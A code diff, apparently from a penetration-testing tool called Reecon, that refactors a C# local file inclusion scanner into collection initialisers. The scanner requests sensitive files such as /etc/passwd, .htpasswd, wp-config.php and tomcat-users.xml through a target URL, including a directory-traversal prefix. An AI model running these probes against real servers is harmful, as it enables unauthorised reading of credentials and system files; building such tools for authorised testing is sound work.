@@ -7,6 +7,7 @@ namespace Reecon
 {
     class LFI
     {
+        [System.Diagnostics.CodeAnalysis.SuppressMessage("Style", "IDE0044:Add readonly modifier")]
         private static WebClient wc = new WebClient();
         private static string initialPart = "";
         private static int notFoundLength = 0;
@@ -30,24 +31,30 @@ namespace Reecon
 
             if (OS == General.OS.Linux)
             {
-                // General web checks
-                List<string> webChecks = new List<string>();
-                webChecks.Add("/var/www/html/.htpasswd");
-                webChecks.Add("/var/www/html/forum/.htpasswd");
+                List<string> webChecks = new List<string>
+                {
+                    // General web checks
+                    "/var/www/html/.htpasswd",
+                    "/var/www/html/forum/.htpasswd",
 
-                // Wordpress
-                webChecks.Add("var/www/html/wp-config.php");
-                webChecks.Add("var/www/html/wordpress/wp-config.php");
+                    // Wordpress
+                    "var/www/html/wp-config.php",
+                    "var/www/html/wordpress/wp-config.php"
+                };
                 DoLFI(webChecks);
 
                 // Do nginx checks
-                List<string> linux_nginx = new List<string>();
-                linux_nginx.Add("/etc/nginx/sites-available/default");
+                List<string> linux_nginx = new List<string>
+                {
+                    "/etc/nginx/sites-available/default"
+                };
                 DoLFI(linux_nginx);
 
                 // Do Apache2 Checks - https://packages.ubuntu.com/eoan/all/apache2/filelist
-                List<string> linux_apache = new List<string>();
-                linux_apache.Add("/etc/apache2/sites-available/000-default.conf");
+                List<string> linux_apache = new List<string>
+                {
+                    "/etc/apache2/sites-available/000-default.conf"
+                };
                 bool hasApache = DoLFI(linux_apache);
                 if (hasApache)
                 {
@@ -62,23 +69,27 @@ namespace Reecon
                 }
 
                 // Do MySQL Checks
-                List<string> linux_mysql = new List<string>();
-                linux_mysql.Add("/etc/my.cnf");
-                linux_mysql.Add("/etc/mysql/my.cnf");
-                linux_mysql.Add("/var/log/mysql/error.log");
+                List<string> linux_mysql = new List<string>
+                {
+                    "/etc/my.cnf",
+                    "/etc/mysql/my.cnf",
+                    "/var/log/mysql/error.log"
+                };
                 DoLFI(linux_mysql);
 
                 // Do Tomcat9 Checks - https://packages.ubuntu.com/eoan/all/tomcat9/filelist
-                List<string> linux_tomcat9 = new List<string>();
-                linux_tomcat9.Add("/etc/cron.daily/tomcat9");
-                linux_tomcat9.Add("/etc/rsyslog.d/tomcat9.conf");
-                linux_tomcat9.Add("/usr/lib/sysusers.d/tomcat9.conf");
-                linux_tomcat9.Add("/usr/lib/tmpfiles.d/tomcat9.conf");
-                linux_tomcat9.Add("/usr/libexec/tomcat9/tomcat-start.sh");
-                linux_tomcat9.Add("/usr/share/tomcat9/etc/server.xml");
-                linux_tomcat9.Add("/usr/share/tomcat9/etc/tomcat-users.xml");
-                linux_tomcat9.Add("/usr/share/tomcat9/etc/web.xml");
-                linux_tomcat9.Add("/var/lib/tomcat9/webapps/ROOT/index.html");
+                List<string> linux_tomcat9 = new List<string>
+                {
+                    "/etc/cron.daily/tomcat9",
+                    "/etc/rsyslog.d/tomcat9.conf",
+                    "/usr/lib/sysusers.d/tomcat9.conf",
+                    "/usr/lib/tmpfiles.d/tomcat9.conf",
+                    "/usr/libexec/tomcat9/tomcat-start.sh",
+                    "/usr/share/tomcat9/etc/server.xml",
+                    "/usr/share/tomcat9/etc/tomcat-users.xml",
+                    "/usr/share/tomcat9/etc/web.xml",
+                    "/var/lib/tomcat9/webapps/ROOT/index.html"
+                };
                 DoLFI(linux_tomcat9);
             }
             else if (OS == General.OS.Windows)
@@ -114,11 +125,13 @@ namespace Reecon
         private static General.OS GetOS()
         {
             // Linux
-            List<string> linuxChecks = new List<string>();
-            linuxChecks.Add("/etc/passwd");
-            linuxChecks.Add("/etc/resolv.conf");
-            linuxChecks.Add("/var/www/index.php");
-            linuxChecks.Add("/var/www/html/index.php");
+            List<string> linuxChecks = new List<string>
+            {
+                "/etc/passwd",
+                "/etc/resolv.conf",
+                "/var/www/index.php",
+                "/var/www/html/index.php"
+            };
             bool hasResult = DoLFI(linuxChecks);
             if (hasResult)
             {
@@ -126,13 +139,15 @@ namespace Reecon
             }
 
             // Windows
-            List<string> windowsChecks = new List<string>();
-            windowsChecks.Add("/boot.ini"); // Basic boot.ini
-            windowsChecks.Add("/inetpub/wwwroot/index.php"); // Basic IIS Webserver
-            windowsChecks.Add("/Windows/debug/NetSetup.log"); // Some basic Windows info
-            windowsChecks.Add("/Windows/SoftwareDistribution/ReportingEvents.log"); // Windows Patches
-            windowsChecks.Add("/Windows/System32/cmd.exe"); // What Windows box doesn't have cmd?
-            windowsChecks.Add("/Windows/win.ini"); // Should have this
+            List<string> windowsChecks = new List<string>
+            {
+                "/boot.ini", // Basic boot.ini
+                "/inetpub/wwwroot/index.php", // Basic IIS Webserver
+                "/Windows/debug/NetSetup.log", // Some basic Windows info
+                "/Windows/SoftwareDistribution/ReportingEvents.log", // Windows Patches
+                "/Windows/System32/cmd.exe", // What Windows box doesn't have cmd?
+                "/Windows/win.ini" // Should have this
+            };
             hasResult = DoLFI(windowsChecks);
             if (hasResult)
             {
@@ -154,10 +169,9 @@ namespace Reecon
             {
                 // Check Base
                 string toCheck = initialPart + check;
-                int resultLength = 0;
                 try
                 {
-                    resultLength = wc.DownloadString(toCheck).Length;
+                    int resultLength = wc.DownloadString(toCheck).Length;
                     if (resultLength != notFoundLength)
                     {
                         Console.WriteLine(resultLength + " -- " + toCheck);
@@ -173,7 +187,7 @@ namespace Reecon
                 toCheck = initialPart + "/../../../../.." + check;
                 try
                 {
-                    resultLength = wc.DownloadString(toCheck).Length;
+                    int resultLength = wc.DownloadString(toCheck).Length;
                     if (resultLength != notFoundLength)
                     {
                         Console.WriteLine(resultLength + " -- " + toCheck);
